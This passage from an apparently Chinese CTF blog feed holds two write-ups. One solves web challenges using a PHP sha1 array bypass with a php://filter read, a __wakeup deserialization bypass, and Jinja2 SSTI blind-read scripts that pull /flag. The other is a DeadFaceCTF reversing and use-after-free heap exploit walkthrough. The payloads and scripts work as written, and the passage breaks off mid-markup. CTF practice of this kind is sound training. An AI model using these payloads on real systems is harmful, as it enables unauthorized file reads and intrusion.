id="2-Check-in"><a href="#2-Check-in" class="headerlink" title="2. Check_in"></a>2. Check_in</h3><p>php语言 对sha1的验证存在漏洞，改成数组则可 均为false。<code>http://114.117.187.56:11000/?file=php://filter/read=convert.base64-encode/resource=flag.php&amp;a[]=a；post_data = &#123;&#39;b[]&#39;: &#39;b&#39;&#125; </code></p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123095515.png" alt="1"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1.</span><span class="token keyword">import</span> requests  <span class="token number">2.</span><span class="token keyword">import</span> random  <span class="token number">3.</span>  <span class="token number">4.</span><span class="token comment"># 定义一个请求头列表，每次调用requests函数时随机从列表中选取header，避免被封。  </span><span class="token number">5.</span>headers_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>  <span class="token number">6.</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3870.400 QQBrowser/10.8.4405.400"</span>  <span class="token number">7.</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token number">8.</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60"</span>  <span class="token number">9.</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token number">10.</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36"</span>  <span class="token number">11.</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token number">12.</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"</span>  <span class="token number">13.</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token number">14.</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0"</span>  <span class="token number">15.</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token number">16.</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 UBrowser/4.0.3214.0 Safari/537.36"</span>  <span class="token number">17.</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token number">18.</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"</span>  <span class="token number">19.</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token number">20.</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"</span>  <span class="token number">21.</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token number">22.</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>  <span class="token number">23.</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span>  <span class="token number">24.</span>  <span class="token number">25.</span>host <span class="token operator">=</span> <span class="token string">"http://114.117.187.56:11000/?file=php://filter/read=convert.base64-encode/resource=flag.php&amp;a[]=a"</span>  <span class="token number">26.</span>endpoint <span class="token operator">=</span> <span class="token string">"post"</span>  <span class="token number">27.</span>url <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>host<span class="token punctuation">,</span> endpoint<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token number">28.</span>  <span class="token number">29.</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'b[]'</span><span class="token punctuation">:</span> <span class="token string">'b'</span><span class="token punctuation">&#125;</span>  <span class="token number">30.</span>headers <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>headers_list<span class="token punctuation">)</span>  <span class="token number">31.</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>  <span class="token number">32.</span><span class="token comment"># response = r.json()  </span><span class="token number">33.</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-可爱的探针"><a href="#3-可爱的探针" class="headerlink" title="3. 可爱的探针"></a>3. 可爱的探针</h3><p>访问 <code>http://117.50.188.49:1145/tz.php?act=phpinfo </code>全局搜索。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123095710.png" alt="1"></p><h3 id="4-baby-ip"><a href="#4-baby-ip" class="headerlink" title="4. baby_ip"></a>4. baby_ip</h3><p>在源码注释中发现密码，将其解码的到字符密码，修改源码中的maxlength，接着提示本地访问，使用burpsite工具抓包，并添加请求头 <code>X-Forwarded-For: 127.0.0.1</code>进行本地访问。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123095744.png" alt="1"></p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123095755.png" alt="2"></p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123095809.png" alt="3"></p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123095823.png" alt="4"></p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123095833.png" alt="5"></p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123095847.png" alt="6"></p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123095902.png" alt="7"></p><h3 id="5-真ikun进"><a href="#5-真ikun进" class="headerlink" title="5. 真ikun进"></a>5. 真ikun进</h3><p>直接在 network 全局搜索 flag，测试代码 并base64解密即可。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123100035.png" alt="1"></p><p>根据这里来构建base64编码字符串，然后解密：</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123100050.png" alt="2"></p><h3 id="6-easy-豪豪扫描器"><a href="#6-easy-豪豪扫描器" class="headerlink" title="6. [easy]豪豪扫描器:"></a>6. [easy]豪豪扫描器:</h3><p>直接notepad 全局检索关键字 ctf。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123100119.png" alt="1"></p><h3 id="7-unserialize"><a href="#7-unserialize" class="headerlink" title="7. unserialize"></a>7. unserialize</h3><p>需要绕过_wakeup()方法。<code>http://114.117.187.56:11008/?p=O:1:%22A%22:2:&#123;s:3:%22kfc%22;s:7:%22v_me_50%22;&#125;</code> 原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123100156.png" alt="1"></p><h3 id="8-Easy-Flask"><a href="#8-Easy-Flask" class="headerlink" title="8. Easy_Flask"></a>8. Easy_Flask</h3><p>构造payload<br><code>&#123;%if (''['__cla''ss__']['__ba''ses__'][0][&#39;__subcl''asses__&#39;]()[118].__name__) == 'FileLoader' %&#125;1&#123;% endif %&#125;</code><br>遍历%d<br><code>pay_load = &quot;&#123;%" + "if 'FileLoader' == (''['__cla''ss__']['__ba''ses__'][0][&#39;__subcl''asses__&#39;]()[%d].__name__)" %i + "%&#125;&quot; + &quot;1&quot; + &quot;&#123;%" +  "endif" + "%&#125;&quot;</code><br>得出 d=118时，返回了OK 。可以利用FileLoader</p><p>利用FileLoader里面的getdata<br><code>&#123;%if (''['__cla''ss__']['__ba''ses__'][0][&#39;__subcl''asses__&#39;]()[118].get_data(0,'/flag').decode('utf-8','ignore')[0]) %&#125;1&#123;% endif %&#125;</code></p><p>遍历128个字符 盲注 测试 如果输出了ok，则拼接到flag字符串中，遍历50次，得到最终flag<br><code>pay_load = &quot;&#123;%" + "if '%s' == (''['__cla''ss__']['__ba''ses__'][0][&#39;__subcl''asses__&#39;]()[118].get_data(0,'/flag').decode('utf-8','ignore')[%d])" % (str1, i) + "%&#125;&quot; + &quot;1&quot; + &quot;&#123;%" + "endif" + "%&#125;&quot;</code></p><p><code>例如：http://114.117.187.56:11003/view?name=&#123;%if '5' == (''['__cla''ss__']['__ba''ses__'][0][&#39;__subcl''asses__&#39;]()[118].get_data(0,'/flag').decode('utf-8','ignore')[28])%&#125;1&#123;%endif%&#125;</code><br>Ok</p><p>scuctf{1eb75f13ba362c3c90030585a85435f4}。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123110110.png" alt="1"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1.</span><span class="token keyword">import</span> requests  <span class="token number">2.</span>flag <span class="token operator">=</span> <span class="token string">""</span>  <span class="token number">3.</span>a <span class="token operator">=</span> <span class="token string">"Ok"</span>        <span class="token comment">#成功后的显示  </span><span class="token number">4.</span>base_url <span class="token operator">=</span> <span class="token string">"http://114.117.187.56:11003/view?name="</span> <span class="token comment">#题目网址  </span><span class="token number">5.</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                   <span class="token comment">#两个循环  </span><span class="token number">6.</span>        <span class="token comment"># pay_load = "&#123;%" + "if \"%s\" == str(('con'~'fig'.Flag[%d]))" % (str1, i) + "%&#125;" + "1" + "&#123;%" +  "endif" + "%&#125;"  </span><span class="token number">7.</span>        pay_load <span class="token operator">=</span> <span class="token string">"&#123;%"</span> <span class="token operator">+</span> <span class="token string">"if 'FileLoader' == (''['__cla''ss__']['__ba''ses__'][0]['__subcl''asses__']()[%d].__name__)"</span> <span class="token operator">%</span>i <span class="token operator">+</span> <span class="token string">"%&#125;"</span> <span class="token operator">+</span> <span class="token string">"1"</span> <span class="token operator">+</span> <span class="token string">"&#123;%"</span> <span class="token operator">+</span>  <span class="token string">"endif"</span> <span class="token operator">+</span> <span class="token string">"%&#125;"</span>  <span class="token number">8.</span>        <span class="token comment"># print(pay_load)  </span><span class="token number">9.</span>        url <span class="token operator">=</span> base_url <span class="token operator">+</span> pay_load  <span class="token number">10.</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>  <span class="token number">11.</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>  <span class="token number">12.</span>        b <span class="token operator">=</span> r<span class="token punctuation">.</span>text  <span class="token number">13.</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>  <span class="token number">14.</span>        <span class="token keyword">if</span> a <span class="token keyword">in</span> b<span class="token punctuation">:</span>                             <span class="token comment">#如果a是在b里面则记入到flag里面  </span><span class="token number">15.</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n\n"</span><span class="token punctuation">)</span>  <span class="token number">16.</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>  <span class="token number">17.</span>            <span class="token keyword">break</span>  <span class="token number">18.</span>  <span class="token number">19.</span><span class="token comment"># &#123;%if (''['__cla''ss__']['__ba''ses__'][0]['__subcl''asses__']()[99].__name__) == 'FileLoader' %&#125;1&#123;% endif %&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1.</span><span class="token keyword">import</span> requests  <span class="token number">2.</span>flag <span class="token operator">=</span> <span class="token string">""</span>  <span class="token number">3.</span>a <span class="token operator">=</span> <span class="token string">"Ok"</span>        <span class="token comment">#成功后的显示  </span><span class="token number">4.</span>base_url <span class="token operator">=</span> <span class="token string">"http://114.117.187.56:11003/view?name="</span> <span class="token comment">#题目网址  </span><span class="token number">5.</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token number">6.</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                     <span class="token comment">#两个循环  </span><span class="token number">7.</span>        str1 <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>  <span class="token number">8.</span>        <span class="token comment"># print(str1)  </span><span class="token number">9.</span>        pay_load <span class="token operator">=</span> <span class="token string">"&#123;%"</span> <span class="token operator">+</span> <span class="token string">"if '%s' == (''['__cla''ss__']['__ba''ses__'][0]['__subcl''asses__']()[118].get_data(0,'/flag').decode('utf-8','ignore')[%d])"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>str1<span class="token punctuation">,</span> i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"%&#125;"</span> <span class="token operator">+</span> <span class="token string">"1"</span> <span class="token operator">+</span> <span class="token string">"&#123;%"</span> <span class="token operator">+</span> <span class="token string">"endif"</span> <span class="token operator">+</span> <span class="token string">"%&#125;"</span>  <span class="token number">10.</span>        <span class="token comment"># print(pay_load)  </span><span class="token number">11.</span>        url <span class="token operator">=</span> base_url <span class="token operator">+</span> pay_load  <span class="token number">12.</span>        <span class="token comment"># print(url)  </span><span class="token number">13.</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>  <span class="token number">14.</span>        b <span class="token operator">=</span> r<span class="token punctuation">.</span>text  <span class="token number">15.</span>        <span class="token comment"># print(b)  </span><span class="token number">16.</span>        <span class="token keyword">if</span> a <span class="token keyword">in</span> b<span class="token punctuation">:</span>                             <span class="token comment">#如果a是在b里面则记入到flag里面  </span><span class="token number">17.</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n\n"</span><span class="token punctuation">)</span>  <span class="token number">18.</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>  <span class="token number">19.</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>  <span class="token number">20.</span>            <span class="token keyword">break</span>  <span class="token number">21.</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"最终的flag！"</span><span class="token punctuation">)</span>  <span class="token number">22.</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Writeup for DeadFaceCTF2022</title>
      <link href="/2022/10/16/writeup-deadfacectf-2022/"/>
      <url>/2022/10/16/writeup-deadfacectf-2022/</url>
      
        <content type="html"><![CDATA[<h1 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h1><p>这次rev做出了两道题，没有什么困难的地方，通过反编译软件可以很清楚地看到源码。程序主题的逻辑也很清晰，主要是涉及了一些关于AES和异或的加密过程。</p><h2 id="deadface2022-re05"><a href="#deadface2022-re05" class="headerlink" title="deadface2022_re05"></a>deadface2022_re05</h2><p>这个主逻辑也很清楚 先要求你输入一个字符串，然后对这个字符串进行sha3哈希，然后判断这个hash字符串和程序中保存的正确的hash字符串一不一样。如果一样的话，他会通过这个字符串来解密(异或操作)加密的字符串，最后返回正确的flag。</p><p>解密的操作是通过hashcat来解密的，我看视频他用的是<code>3070ti</code>。当然还有一个字典，然后一下子就算出来了。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221019184046.png" alt="hash破解"></p><h2 id="re03-another-fine-product"><a href="#re03-another-fine-product" class="headerlink" title="re03-another-fine-product"></a>re03-another-fine-product</h2><p>这是一个软件，通过软件中的点击操作获取到相应的信息。</p><p><strong>此题和现实中的软件破解很类似，为了保护软件的收益，通常会采取用户验证的方式。而这部分验证的代码通常是非常复杂且不可见的。但是有些时候，我们可以修改程序流，使程序跳过验证的步骤，从而达到破解软件的效果。</strong></p><h3 id="主要逻辑"><a href="#主要逻辑" class="headerlink" title="主要逻辑"></a>主要逻辑</h3><p>软件本身没有什么问题，就是简单的一些菜单和点击之后出现的弹窗。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221023144355.png" alt="软件截图"></p><h3 id="做法"><a href="#做法" class="headerlink" title="做法"></a>做法</h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221023144745.png" alt="WindbgPreview"></p><h3 id="基础的知识"><a href="#基础的知识" class="headerlink" title="基础的知识"></a>基础的知识</h3><ul><li>user32.dll Windows用户界面相关应用程序接口 user32.dll是Windows用户界面相关应用程序接口，用于包括Windows处理，基本用户界面等特性，如创建窗口和发送消息。</li><li>ntdll.dll Windows NT内核级文件 ntdll.dll是重要的Windows NT内核级文件。描述了windows本地NTAPI的接口。当Windows启动时，ntdll.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域。</li></ul><h2 id="symkeygen"><a href="#symkeygen" class="headerlink" title="symkeygen"></a>symkeygen</h2><p>把生成密钥的程序，隐藏在数字或者字符串中。等程序真正运行地时候，在将这些数字或字符串，通过一系列操作转换为真正的程序逻辑。这种思想很值得借鉴。</p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;&#x2F;*glibc 2.30, Ubuntu 64bitHow to use password:$ openssl enc -aes256 -k &#123;PASSWORD&#125; -in secret.txt -out secret.bin*&#x2F;unsigned regs[4];int program[] &#x3D;&#123;593920, 598016, 602112, 593920, 598016, 328196, 655360, 205573, 659456, 397327, 405517, 663552, 139523, 593920, 143618, 667648, 598016, 663552, 593920, 593920, 405509, 139523, 663552, 659456, 602112, 397317, 270595, 340480, 667648, 593920, 598016, 602112, 593920, 598016, 328196, 655360, 205573, 659456, 397327, 405517, 663552, 139523, 593920, 143618, 667648, 598016, 663552, 593920, 593920, 405509, 139523, 663552, 659456, 602112, 397317, 270595, 340480, 667648&#125;;char stack[33] &#x3D;&quot;&quot;;int pc &#x3D; 0;int ins &#x3D; 0;int reg1 &#x3D; 0;int reg2 &#x3D; 0;int reg3 &#x3D; 0;int imm &#x3D; 0;int fl &#x3D; 0;int sp &#x3D; 0;void decode(int instr)&#123;  ins  &#x3D; (instr &amp; 0xF0000) &gt;&gt; 16;  reg1 &#x3D; (instr &amp; 0xF000 ) &gt;&gt;  12;  reg2 &#x3D; (instr &amp; 0xF00  ) &gt;&gt;  8;  reg3 &#x3D; (instr &amp; 0xF   );  imm  &#x3D; (instr &amp; 0xFF  );&#125;int running &#x3D; 1;int fetch()&#123;return program [pc++];&#125;void eval()&#123;switch (ins)&#123;case 0:&#x2F;&#x2F;retrunning &#x3D; 0;break;case 1:&#x2F;&#x2F;popregs[reg1] &#x3D; (int)stack[sp--];fl &#x3D; 0;break;case 2:&#x2F;&#x2F;subregs[reg1] &#x3D; regs[reg2] - regs[reg3];fl &#x3D; regs[reg1];break;case 3:&#x2F;&#x2F;subimmregs[reg1] &#x3D; regs[reg2] - imm;fl &#x3D; regs[reg1];break;case 4:&#x2F;&#x2F;addregs[reg1] &#x3D; regs[reg2] + regs[reg3];fl &#x3D; 0;break;case 5:&#x2F;&#x2F;addimmregs[reg1] &#x3D; regs[reg2] + imm;fl &#x3D;0;break;case 6:&#x2F;&#x2F;loadiregs[reg1] &#x3D; imm;fl &#x3D; 0;case 7:&#x2F;&#x2F;jneif (fl !&#x3D; 0)&#123;pc &#x3D; imm;&#125;fl &#x3D; 0;break;case 8:&#x2F;&#x2F;jmppc &#x3D; imm;fl &#x3D;0;break;case 9:&#x2F;&#x2F;rand            regs[reg1] &#x3D; ((rand() % 16) +70);break;        case 10:            &#x2F;&#x2F;push            stack[sp++] &#x3D; (char)regs[reg1];fl &#x3D; 0;&#125;&#125;int run()&#123;while(running)&#123;int instr &#x3D; fetch();decode(instr);eval();&#125;return imm;&#125;int main (int argc, char **argv) &#123;   int i, n;time_t t;    n &#x3D; 32;     srand((unsigned) time(&amp;t));  printf(&quot;Beginning key generation at %lu\n&quot;, (unsigned long) t);    run();printf(&quot;Your strong password is %s\n&quot;, stack);    return(0);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>这个题是<code>jack</code>与我交流的时候讨论到的。里面有一个非常重要的点需要总结。</p><p>以前我认为<code>call function_name</code>的时候，<code>function_name</code>必须要位于整个函数最开始的地方。</p><p>但实际上，并不是如此。因为CPU也不知道你这个<code>function_name</code>到底是不是在整个函数最开始的地方。</p><h2 id="主体逻辑"><a href="#主体逻辑" class="headerlink" title="主体逻辑"></a>主体逻辑</h2><ol><li><p>首先程序是运行在服务器端利用tcp套接字来与客户端进行交互，无任何保护措施，提供了上图的6个功能。<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016131314.png" alt="主题逻辑"></p></li><li><p><code>Make Target</code>功能，会通过用户的输入。利用malloc函数申请一个0x18的堆空间创建一个Target结构体。这个结构体的第二个成员是一个函数指针，指向一个删除结构体的函数。</p></li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016131713.png" alt="delete_structure"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016131744.png" alt="Target结构体"></p><ol start="3"><li><code>Create an Exploit</code>功能，会通过用户输入。利用malloc函数申请一个0x18的堆空间创建Exploit结构体。</li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016131925.png" alt="Exploit结构体"></p><ol start="4"><li><code>retrieve_admin_key</code>，验证用户输入的密码，正确则返回flag。</li></ol><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">ssize_t retrieve_admin_key()&#123;  ssize_t result; &#x2F;&#x2F; eax  send(fork_sock, &quot;What is the password?\n&quot;, 0x17u, 0);  recv(fork_sock, &quot;aaaaaaaaaaaaaaaa&quot;, 0x10u, 0);  if ( !strcmp(&quot;ga*wi58Fw#o&amp;WOG9&quot;, &quot;aaaaaaaaaaaaaaaa&quot;) )    result &#x3D; send(fork_sock, &quot;flag&#123;--------------------------&#125;\n&quot;, 0x22u, 0);  else    result &#x3D; send(fork_sock, &quot;Bad Password\n&quot;, 0xEu, 0);  return result;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="堆利用"><a href="#堆利用" class="headerlink" title="堆利用"></a>堆利用</h2><p>Target结构体和Exploit结构体都是申请的堆空间上大小为0x18的空间。而且程序在这个过程中没有申请过其他堆块。此外delete_struct的函数里面的只是简单调用了<code>free</code>函数。<code>free</code>函数会操作堆块的头部，而不会清除此前保留在堆块中的数据。指向堆块的指针实际上还是指向的这个已经被释放的堆块的用户可以用空间首地址。但是这个时候注意，由于堆块已经释放，此前用户可用地址的前8个字节已经变成了指向前一个可用堆块和后一个可用堆块的指针。</p><p>那么，我们通过创建一个Target然后再删除，然后创建一个<code>Exploit</code>结构体，这样的话，Exploit结构体申请到的堆空间与之前删除的Target结构体申请的堆空间是一致的。那么Delete_structure这个成员的内容就变成我们可以操控的了。接着就需要使用delete功能调用这个函数就行。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">switch ( buf ) &#123;   case 0:   case 49:     v5 &#x3D; newS1(v7);     break;   case 50:     if ( v5 ) &#x2F;&#x2F; v5在调用delete函数之后，实际上还是指向的已经被释放的堆空间的地址。     &#x2F;&#x2F;所以，我们再exploit中构造函数指针之后，依然是可以调用我们修改的函数指针。       (*(void (__cdecl **)(int, int *))(v5 + 16))(v5, v7);     else       send(*v7, &quot;No target?\n&quot;, 0xCu, 0);     break;   case 51:     v6 &#x3D; newS2(v7);     break;   case 52:     check_compatability(v5, v6, v7);     break;   case 53:     retrieve_admin_key();     break;   default:     return __readgsdword(0x14u) ^ v9; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016133405.png" alt="对比"></p><p>该程序没有开启任何的保护机制，所以我们接下来要考虑的就是应该修改或者跳转到哪里？</p><p>开始我一直以为，这个地址只能是函数的首地址。实际上通过我们最开始描述，这个地址不是首地址也可以。只不过可能后续程序就没办法正常运行了。</p><p>所以我们直接跳到了下图所示位置，注意这个时候要保证send函数参数的正确性。注意寄存器里面的值前后的变化。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016134322.png" alt="跳转位置"></p><p>实际上，这个跳转位置并不是check_compatability函数的开始部分。因为我们无法知道这个正确的密码，只能是跳过验证的部分。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016134429.png" alt="效果"></p><h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><p>Target结构体申请到的堆空间</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016134658.png" alt="Target结构体申请到的堆空间"></p><p>创建Target结构体之后堆空间的内容</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016141528.png" alt="创建Target结构体之后堆空间的内容"></p><p>删除掉我们申请的Target时<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016135032.png" alt="delete_structure"></p><p>删除掉Target之后，堆空间中的内容</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016141136.png" alt="删除Target之后的堆块"></p><p>创建Exploit结构体</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016141808.png" alt="创建Exploit结构体"></p><p>第二次，使用删除功能，可以发现之前指向堆空间的指针依然是指向的堆空间的用户可用地址。并没有被清零。实际只是堆块放到了空闲管理的堆块表里面去了。而且我们调用的call也只指向了retrieve_admin_key函数</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016141940.png" alt="第二次，使用删除功能"></p><p>当我们步入之后发现，call指令同样还是先把返回地址压栈，然后再将我们设置的指令地址弹出到eip中。<br><img 